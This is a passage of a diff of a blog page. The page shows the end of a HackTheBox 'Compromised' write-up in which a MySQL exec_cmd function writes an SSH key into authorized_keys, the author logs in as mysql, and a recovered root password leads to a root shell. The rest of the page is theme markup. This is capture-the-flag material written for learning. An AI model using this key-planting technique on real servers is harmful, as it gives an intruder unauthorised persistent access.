+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -pchangethis -e <span class="string">&quot;SELECT exec_cmd(&#x27;echo sshxxxxxxxxxxx&#x27; &gt; /var/lib/mysql/.ssh/authorized_keys)&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p>One thing to note here, you have to encode the <code>+</code> into <code>%2B</code> else it will be shown as a whitespace in authorized_keys file</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2</span><br><span class="line">mysql@compromised:~$ </span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2</span><br><span class="line">mysql@compromised:~$ </span><br></pre></td></tr></table></figure>
 
 <p>and we are in using ssh.</p>
 <p>After more enumeration</p>
@@ -65,11 +183,203 @@
 <p>convert the unsigned-hex to char sequence</p>
 <p><img src="/images/HTB-Compromised-Hard/image-20200918175715611.png" alt="image-20200918175715611"></p>
 <p>and we got the password <code>zlke~U3Env82m2-</code> with a null behind </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@compromised:~<span class="comment"># whoami &amp;&amp; hostname</span></span><br><span class="line">root</span><br><span class="line">compromised</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@compromised:~<span class="comment"># whoami &amp;&amp; hostname</span></span><br><span class="line">root</span><br><span class="line">compromised</span><br></pre></td></tr></table></figure>
 
 <br/>
 <br/>
 <br/>
 
 <p><img src="/images/root.gif" alt="root"></p>
-</div></article></div></main><footer><div class="paginator"><a href="/2020/09/19/HTB-fortress-akerva/" class="prev">PREV</a><a href="/2020/09/11/Challenge-Cat/" class="next">NEXT</a></div><div class="copyright"><p>© 2019 - 2023 <a href="http://example.com">Ikonw</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/MikeCoder/hexo-theme-gandalfr" target="_blank">hexo-theme-gandalfr</a>.</p></div></footer></div><script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js" crossorigin="anonymous"></script><script src="//cdn.bootcss.com/jquery/3.1.1/jquery.js" crossorigin="anonymous"></script><script>$(document).ready(function() { hljs.configure({useBR: true}); $('pre').each(function(i, block) { hljs.highlightBlock(block); }); });</script></body></html>
+  	
+					
+	  </div>     
+	  
+
+	<div class="bottom">
+  <div class="other">
+    <div class="meta">
+      
+      <i class="iconfont icon-category"></i>
+      <a class="category-link" href="/categories/hackthebox/">hackthebox</a>
+
+      
+
+      
+      <i class="iconfont icon-tag"></i>
+      <a class="tag-none-link" href="/tags/hackthebox/" rel="tag">hackthebox</a> <a class="tag-none-link" href="/tags/mysql-exec-cmd/" rel="tag">mysql exec_cmd</a> <a class="tag-none-link" href="/tags/reverse/" rel="tag">reverse</a>
+      
+    </div>
+
+    <div class="operate">
+      
+      <span class="text">Share</span>
+      <ul class="share">
+	   			             
+        <li class="iconfont 
+		icon-share-weixin 
+		-mob-share-weixin 
+		item"
+		></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-twitter 
+		-mob-share-twitter 
+		item"
+		></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-google 
+		-mob-share-google 
+		item"
+		></li>		
+   	   
+</ul>	
+
+<script id="-mob-share" 
+src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+      
+    </div>
+  </div>
+
+
+  
+  <nav class="nav">
+    <div class="link">
+      
+      <a href="/2020/09/11/Challenge-Cat/" class="link-wrap">
+        <strong class="caption">older</strong>
+        
+        <span class="title">
+          HTB::Challenge [Mobile] Cat
+        </span>
+      </a>
+      
+    </div>
+    <div class="link">
+      
+      <a href="/2020/09/19/HTB-fortress-akerva/" class="link-wrap">
+        <strong class="caption">newer</strong>
+        
+        <span class="title">
+          HTB Akerva Fortress writeup (Password protected)
+        </span>
+      </a>
+      
+    </div>
+  </nav>
+  
+</div> 
+	
+<div class="comment">
+
+    
+
+    <div id="comment">
+    </div>
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+
+    <script src='//unpkg.com/valine@v1.1.8-beta/dist/Valine.min.js'></script>
+
+    <script>
+        new Valine({
+            el: '#comment',
+            notify: false,
+            verify: false,
+            app_id: 'cFM0eCo0CQ9xmBXmHi1eltol-gzGzoHsz',
+            app_key: 'oh9tizsnvV2vNvWgqEvoNtQO',
+            path: window.location.pathname,
+            avatar: 'mm',
+            guest_info: ['nick', 'mail']
+        });
+    </script>
+    
+</div>	
+</article>
+
+          </div> 
+      </div>            
+    
+        <i id="toTop" class="iconfont icon-backtotop"></i>
+
+  
+    <div class="none" id="search">
+    <div class="header">
+        <input type="text" 
+        placeholder="Typing Something here." 
+        id="search-input" 
+        class="input" />
+        
+        <i id="search-cancel" class="iconfont icon-cancel"></i>
+    </div>
+
+    <div id="search-result" class="result"></div>
+</div>
+     <div class="mobile-menu">      
+
+      
+      <img class="mobile-menu-icon" src= "/images/favicon.png" >  
+      
+
+         
+            
+
+            <a class="mobile-menu-link" href="/">Home
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/archives">Archives
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/tags">Tags
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/about">About
+            </a>
+            
+         
+                          
+
+            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
+            
+         
+      
+</div>
+        
+    
+
+
+
+     
+    
+
+
+<footer class="footer">
+	<div class="inner">
+		<div class="copyright">
+			&copy;
+			
+			2019 -
+			
+			2023
+			Ikonw
+
+			<br/>
+			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
+		</div>
+	</div>
+</footer>   
+
+    
+<script src="/nayo.bundle.js"></script>
+           
+  </body>        
+</html>
